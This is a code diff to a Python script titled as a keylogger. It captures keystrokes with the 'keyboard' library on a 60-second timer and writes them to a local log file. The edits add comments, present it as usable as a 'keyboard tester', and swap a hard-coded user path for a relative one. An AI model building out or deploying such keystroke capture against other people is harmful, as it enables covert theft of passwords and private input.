@@ -1,18 +1,18 @@
-# Trail Build and Test For Keylogger
+# Trail Build and Test For Keylogger can also be used as a "keyboard tester", when used with a tkinter module
 
 from re import L
 import keyboard
-from threading import Timer
+from threading import Timer # To make it so that the code runs after a time interval
 from datetime import datetime
 
 
-Send_Report = 60 
+Send_Report = 60 # in seconds format
 
 class Keylogger:
   def __init__(self,interval,report_method="txt"):
     self.interval  = interval
     self.report_method = report_method
-    self.log = ""
+    self.log = ""                        # initialize a string which we can then copy to our output log folder , it contains all the keystrokes within self interval
 
     self.start_dt = datetime.now()
     self.stop_dt = datetime.now()
@@ -33,8 +33,9 @@ class Keylogger:
     self.log = self.log + name  
     
   def write(self):
+    # to open a file in the current directory where the .py file is running from 
 
-    with open(fr"C:\Users\harish\Documents\log.txt","w") as f:
+    with open("log.txt","w") as f:
       print(self.log,file=f)
 
   
